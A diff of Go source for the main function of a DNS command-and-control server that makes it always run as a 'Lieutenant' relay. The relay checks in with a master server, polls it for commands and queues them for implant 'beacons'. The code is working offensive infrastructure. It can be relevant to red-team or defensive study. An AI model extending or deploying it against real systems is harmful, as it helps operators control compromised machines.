@@ -474,22 +474,26 @@ func handleQuery(packet []byte, cfg Config, clientIP string) ([]byte, error) {
 
 func main() {
 	// Parse command line flags
-	debugFlag := flag.Bool("d", false, "Enable debug mode (overrides config)")
+	debugFlag := flag.Bool("d", false, "Enable debug mode")
 	bindAddrFlag := flag.String("bind-addr", "", "Override bind address (e.g., 0.0.0.0)")
+	bindPortFlag := flag.Int("bind-port", 0, "Override bind port (default: 53)")
 	flag.Parse()
 
-	// Load configuration (from config.json or DNS_CONFIG env var)
+	// Load embedded configuration
 	cfg, err := LoadConfig()
 	if err != nil {
-		panic(fmt.Sprintf("failed to load config: %v", err))
+		panic(fmt.Sprintf("Failed to load configuration: %v\nThis binary must be built using the builder with embedded configuration.", err))
 	}
 
-	// Command line flags override config file
+	// Command line flags override embedded config
 	if *debugFlag {
 		cfg.Debug = true
 	}
 	if *bindAddrFlag != "" {
 		cfg.BindAddr = *bindAddrFlag
+	}
+	if *bindPortFlag != 0 {
+		cfg.BindPort = *bindPortFlag
 	}
 	debugMode = cfg.Debug
 
@@ -549,82 +553,69 @@ func main() {
 		fmt.Println("WARNING: Binding to 0.0.0.0 - responses may come from unexpected interface")
 	}
 
-	// Check operation mode and initialize accordingly
-	if cfg.IsDistributedMode() {
-		// DISTRIBUTED MODE: Connect to Master Server
-		fmt.Printf("\n\033[0;36m==================================================\033[0m\n")
-		fmt.Printf("\033[0;36mMode: DISTRIBUTED (Lieutenant)\033[0m\n")
-		fmt.Printf("Master Server: %s\n", cfg.MasterServer)
-		fmt.Printf("Server ID: %s\n", cfg.MasterServerID)
-		fmt.Printf("\033[0;36m==================================================\033[0m\n\n")
+	// DISTRIBUTED MODE: Connect to Master Server
+	fmt.Printf("\n\033[0;36m==================================================\033[0m\n")
+	fmt.Printf("\033[0;36mMode: DISTRIBUTED (Lieutenant)\033[0m\n")
+	fmt.Printf("Master Server: %s\n", cfg.MasterServer)
+	fmt.Printf("Server ID: %s\n", cfg.MasterServerID)
+	fmt.Printf("\033[0;36m==================================================\033[0m\n\n")
 
-		// Initialize Master Client
-		masterClient = NewMasterClient(cfg.MasterServer, cfg.MasterServerID, cfg.MasterAPIKey, debugMode)
+	// Initialize Master Client
+	masterClient = NewMasterClient(cfg.MasterServer, cfg.MasterServerID, cfg.MasterAPIKey, debugMode)
 
-		// Perform initial check-in
-		fmt.Println("Connecting to Master Server...")
-		stats := map[string]interface{}{
+	// Perform initial check-in
+	fmt.Println("Connecting to Master Server...")
+	stats := map[string]interface{}{
+		"domain":       cfg.Domain,
+		"bind_addr":    cfg.BindAddr,
+		"beacon_count": 0,
+		"startup_time": time.Now().Unix(),
+	}
+
+	if err := masterClient.Checkin(stats); err != nil {
+		fmt.Printf("⚠️  WARNING: Initial checkin to Master Server failed: %v\n", err)
+		fmt.Println("Continuing in resilient mode (will retry in background)")
+	} else {
+		fmt.Println("✓ Connected to Master Server successfully")
+	}
+
+	// Start periodic check-in (every 30 seconds)
+	masterClient.StartPeriodicCheckin(30*time.Second, func() map[string]interface{} {
+		beacons := c2Manager.GetBeacons()
+		return map[string]interface{}{
 			"domain":       cfg.Domain,
 			"bind_addr":    cfg.BindAddr,
-			"beacon_count": 0,
-			"startup_time": time.Now().Unix(),
+			"beacon_count": len(beacons),
+			"uptime":       time.Since(time.Now()).Seconds(),
 		}
+	})
 
-		if err := masterClient.Checkin(stats); err != nil {
-			fmt.Printf("⚠️  WARNING: Initial checkin to Master Server failed: %v\n", err)
-			fmt.Println("Continuing in resilient mode (will retry in background)")
-		} else {
-			fmt.Println("✓ Connected to Master Server successfully")
-		}
-
-		// Start periodic check-in (every 30 seconds)
-		masterClient.StartPeriodicCheckin(30*time.Second, func() map[string]interface{} {
-			beacons := c2Manager.GetBeacons()
-			return map[string]interface{}{
-				"domain":       cfg.Domain,
-				"bind_addr":    cfg.BindAddr,
-				"beacon_count": len(beacons),
-				"uptime":       time.Since(time.Now()).Seconds(),
-			}
-		})
-
-		// Start periodic task polling (every 10 seconds)
-		masterClient.StartPeriodicTaskPoll(10*time.Second, func(tasks []TaskResponse) {
-			for _, task := range tasks {
-				// Queue task in C2Manager using the new AddTaskFromMaster function
-				// This tracks both local and master task IDs for proper result submission
-				c2Manager.AddTaskFromMaster(task.ID, task.BeaconID, task.Command)
-				if debugMode {
-					logf("[Distributed] Received task %s from master for beacon %s", task.ID, task.BeaconID)
-				}
-			}
-		})
-
-		// Start periodic beacon sync (every 30 seconds)
-		// This ensures all DNS servers know about beacons registered on other servers
-		masterClient.StartPeriodicBeaconSync(30*time.Second, func(beacons []BeaconData) {
-			for _, beaconData := range beacons {
-				// Sync beacon to local C2Manager
-				c2Manager.SyncBeaconFromMaster(beaconData)
-			}
+	// Start periodic task polling (every 10 seconds)
+	masterClient.StartPeriodicTaskPoll(10*time.Second, func(tasks []TaskResponse) {
+		for _, task := range tasks {
+			// Queue task in C2Manager using the new AddTaskFromMaster function
+			// This tracks both local and master task IDs for proper result submission
+			c2Manager.AddTaskFromMaster(task.ID, task.BeaconID, task.Command)
 			if debugMode {
-				logf("[Distributed] Synced %d beacon(s) from master", len(beacons))
+				logf("[Distributed] Received task %s from master for beacon %s", task.ID, task.BeaconID)
 			}
-		})
+		}
+	})
 
-		fmt.Println("Console disabled (distributed mode)")
-		fmt.Println()
-	} else {
-		// STANDALONE MODE: Start interactive console
-		fmt.Printf("\n\033[0;32m==================================================\033[0m\n")
-		fmt.Printf("\033[0;32mMode: STANDALONE\033[0m\n")
-		fmt.Printf("Console: Interactive\n")
-		fmt.Printf("\033[0;32m==================================================\033[0m\n\n")
-		fmt.Println("C2 Management Console: Use 'help' for available commands")
+	// Start periodic beacon sync (every 30 seconds)
+	// This ensures all DNS servers know about beacons registered on other servers
+	masterClient.StartPeriodicBeaconSync(30*time.Second, func(beacons []BeaconData) {
+		for _, beaconData := range beacons {
+			// Sync beacon to local C2Manager
+			c2Manager.SyncBeaconFromMaster(beaconData)
+		}
+		if debugMode {
+			logf("[Distributed] Synced %d beacon(s) from master", len(beacons))
+		}
+	})
 
-		// Start C2 management console in a separate goroutine
-		go startC2Console()
-	}
+	fmt.Println("Console disabled (distributed mode - use Master server web UI)")
+	fmt.Println()
 
 	// Increase read buffer if needed for performance
 	_ = pc.SetReadDeadline(time.Time{})
